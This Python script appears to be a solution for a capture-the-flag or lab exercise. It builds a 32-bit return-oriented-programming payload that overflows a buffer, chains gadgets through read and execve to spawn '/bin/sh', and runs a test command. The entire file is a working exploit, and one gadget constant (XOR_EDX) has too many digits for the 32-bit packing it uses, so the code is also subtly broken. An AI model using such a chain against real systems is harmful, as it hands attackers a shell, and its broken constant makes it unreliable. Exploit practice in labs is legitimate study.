import sys, struct, os
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
CWD = "/mnt/c/Users/arnol/AppData/Local/Temp/cylab_eps"
EAX3, ADD2, ADD3 = 0x0809dae0, 0x0809da87, 0x0809daa0
POP_EBX, POP_ECX, POP_EDX = 0x0804901e, 0x08049a31, 0x0805848e
INT80, XOR_EDX, BSS = 0x0805e4b0, 0x080493fd3, 0x080e5000


def p32(x):
    return struct.pack("<I", x)


c = b""
c += p32(EAX3)
c += p32(POP_EBX) + p32(0)
c += p32(POP_ECX) + p32(BSS)
c += p32(POP_EDX) + p32(8) + p32(0) + p32(0)
c += p32(INT80)
c += p32(XOR_EDX) + p32(0) * 4
c += p32(EAX3) + p32(ADD2) + p32(ADD3) + p32(ADD3)
c += p32(POP_EBX) + p32(BSS)
c += p32(POP_ECX) + p32(0)
c += p32(INT80)
payload = b"A" * 28 + c
open(os.path.join(CWD, "in292.bin"), "wb").write(payload + b"\n" + b"/bin/sh\x00" + b"echo PWNED_OK\n")
print("ecrit:", len(payload))
